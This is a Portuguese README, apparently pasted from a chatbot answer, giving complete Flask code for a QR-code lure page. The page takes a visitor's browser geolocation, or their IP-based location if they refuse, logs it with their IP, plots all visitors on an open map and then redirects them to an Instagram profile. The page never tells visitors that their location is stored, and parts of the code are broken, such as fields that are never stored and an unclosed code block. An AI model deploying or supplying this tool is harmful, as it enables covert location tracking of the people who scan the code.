# Projeto de Localização e Redirecionamento

Este projeto visa capturar a geolocalização de um visitante por meio do navegador ou pelo IP e exibir a localização em um mapa. Após capturar a localização, o visitante será redirecionado para uma página do Instagram. O backend é implementado em Flask e utiliza o Leaflet.js para exibir o mapa.

Estrutura do Projeto

A estrutura de diretórios do projeto deve ser organizada da seguinte forma:

/project
│
├── /static
│   └── /js
│       └── coleta.js
│
├── /templates
│   ├── coleta.html
│   ├── mapa.html
│   └── acessos.html
│
├── requirements.txt
├── servidor.py
├── gerar_qrcode.py
└── README.md



## 1. **Requisitos do Projeto**

Criar uma conta no github e um repositorio
git init
git status
git add 
git commit -m "Primeiro commit"
git remote add origin https://github.com/SEU_USUARIO/NOME_DO_REPOSITORIO.git
git remote add origin https://github.com/mateusflorenzano/localizacao-qrcode.git



O conteúdo do arquivo requirements.txt é:


Flask==2.1.1
requests==2.26.0
qrcode==6.1

Antes de começar, você precisa instalar as dependências do projeto. Use o arquivo `requirements.txt` para instalar todos os pacotes necessários:

```bash
pip install -r requirements.txt


# Estrutura do Projeto

#2. Configuração e Execução
#2.1. Servidor Flask (servidor.py)


O servidor.py é responsável por gerenciar as rotas do Flask, incluindo a coleta de informações de geolocalização e o redirecionamento para o Instagram. O código é o seguinte:


from flask import Flask, request, redirect, jsonify, render_template
import datetime

app = Flask(__name__)
acessos = []

@app.route('/')
def solicitar_localizacao():
    return render_template('coleta.html')

@app.route('/registrar', methods=['POST'])
def registrar():
    data = request.get_json()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()

    acesso = {
        'ip': ip,
        'lat': data.get('lat'),
        'lon': data.get('lon'),
        'precisa': data.get('precisa', False),
        'timestamp': datetime.datetime.now().isoformat()
    }
    acessos.append(acesso)
    return jsonify({'status': 'ok'})

@app.route('/acessos')
def mostrar_acessos():
    return render_template("acessos.html", acessos=acessos)

@app.route('/mapa')
def exibir_mapa():
    return render_template("mapa.html", acessos=acessos)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5002)



2.2. HTML - Coleta de Localização (coleta.html)


Este arquivo exibe uma mensagem enquanto coleta a localização do usuário. Ele solicita a permissão para acesso à geolocalização do navegador e, dependendo da resposta, envia as coordenadas via AJAX para o servidor.




html
Copiar
Editar
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Localizando...</title>
    <script>
        function enviarLocalizacao(lat, lon, precisa) {
            fetch('/registrar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ lat, lon, precisa })
            }).finally(() => {
                window.location.href = "https://www.instagram.com/mateusflorenzano?igsh=ZmF5a2UyNml3Nmc0";
            });
        }

        function obterLocalizacao() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        enviarLocalizacao(pos.coords.latitude, pos.coords.longitude, true);
                    },
                    erro => {
                        fetch('https://ipinfo.io/json?token=SEU_TOKEN_IPINFO')
                            .then(res => res.json())
                            .then(d => {
                                const [lat, lon] = d.loc.split(',');
                                enviarLocalizacao(parseFloat(lat), parseFloat(lon), false);
                            }).catch(() => {
                                enviarLocalizacao(0.0, 0.0, false);
                            });
                    },
                    { timeout: 5000 }
                );
            } else {
                enviarLocalizacao(0.0, 0.0, false);
            }
        }

        window.onload = obterLocalizacao;
    </script>
</head>
<body>
    <p>Obtendo sua localização...</p>
</body>
</html>


2.3. HTML - Exibição do Mapa (mapa.html)

Este arquivo exibe um mapa com as localizações dos visitantes usando o Leaflet.js. As coordenadas dos acessos são passadas dinamicamente para o mapa.

html
Copiar
Editar
<!DOCTYPE html>
<html>
<head>
    <title>Mapa de Acessos</title>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
    <style>
        #map { height: 100vh; width: 100vw; margin: 0; padding: 0; }
        body { margin: 0; }
    </style>
</head>
<body>
    <div id="map"></div>
    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
    <script>
        const acessos = {{ acessos | tojson }};
        const map = L.map('map').setView([-14.2, -51.9], 4);

        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '© OpenStreetMap contributors'
        }).addTo(map);

        acessos.forEach(({ lat, lon, ip, city, region, country }) => {
            if (lat && lon && lat !== 0.0 && lon !== 0.0) {
                L.marker([lat, lon]).addTo(map)
                    .bindPopup(`<b>IP:</b> ${ip}<br><b>${city}, ${region} - ${country}</b>`);
            }
        });
    </script>
</body>
</html>



2.4. HTML - Lista de Acessos (acessos.html)


Este arquivo exibe uma lista com os acessos registrados, mostrando o IP, cidade, país e coordenadas.

html
Copiar
Editar
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Acessos</title>
    <style>
        body { font-family: Arial; padding: 20px; }
        .acesso { border-bottom: 1px solid #ddd; margin-bottom: 10px; padding-bottom: 10px; }
    </style>
</head>
<body>
    <h1>Lista de Acessos</h1>
    {% for acesso in acessos %}
        <div class="acesso">
            <strong>IP:</strong> {{ acesso.ip }}<br>
            <strong>Cidade:</strong> {{ acesso.city }}<br>
            <strong>País:</strong> {{ acesso.country }}<br>
            <strong>Latitude:</strong> {{ acesso.lat }}<br>
            <strong>Longitude:</strong> {{ acesso.lon }}<br>
        </div>
    {% endfor %}
</body>
</html>


2.5. Gerar QR Code (gerar_qrcode.py)


Este script Python gera um QR Code com o link para o seu projeto Flask. Use este código para gerar o link que os usuários irão escanear.

python
Copiar
Editar
import qrcode

url = "http://seu-link-aqui"  # Substitua pelo URL do seu servidor Flask
qr = qrcode.make(url)
qr.save("qrcode.png")



2.6. Arquivo JavaScript para Coleta de Localização (static/js/coleta.js)
O arquivo coleta.js contém o código JavaScript que gerencia a coleta de geolocalização do usuário. Ele é referenciado no arquivo coleta.html.


// Código para coletar a localização e enviar ao servidor
function enviarLocalizacao(lat, lon, precisa) {
    fetch('/registrar', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ lat, lon, precisa })
    }).finally(() => {
        window.location.href = "https://www.instagram.com/mateusflorenzano?igsh=ZmF5a2UyNml3Nmc0";
    });
}

function obterLocalizacao() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            pos => {
                enviarLocalizacao(pos.coords.latitude, pos.coords.longitude, true);
            },
            erro => {
                fetch('https://ipinfo.io/json?token=SEU_TOKEN_IPINFO')
                    .then(res => res.json())
                    .then(d => {
                        const [lat, lon] = d.loc.split(',');
                        enviarLocalizacao(parseFloat(lat), parseFloat(lon), false);
                    }).catch(() => {
                        enviarLocalizacao(0.0, 0.0, false);
                    });
            },
            { timeout: 5000 }
        );
    } else {
        enviarLocalizacao(0.0, 0.0, false);
    }
}

window.onload = obterLocalizacao;



3. Executando o Servidor
Para rodar o servidor Flask:


python servidor.py
Isso iniciará o servidor Flask na porta 5002.

4. Gerar QR Code
Use o script gerar_qrcode.py para gerar um QR Code para o link do servidor Flask.


python gerar_qrcode.py
Isso gerará um arquivo qrcode.png que pode ser impresso ou compartilhado.

Com isso, o seu sistema estará pronto para funcionar. Se tiver mais alguma dúvida ou precisar de mais ajustes, só avisar!


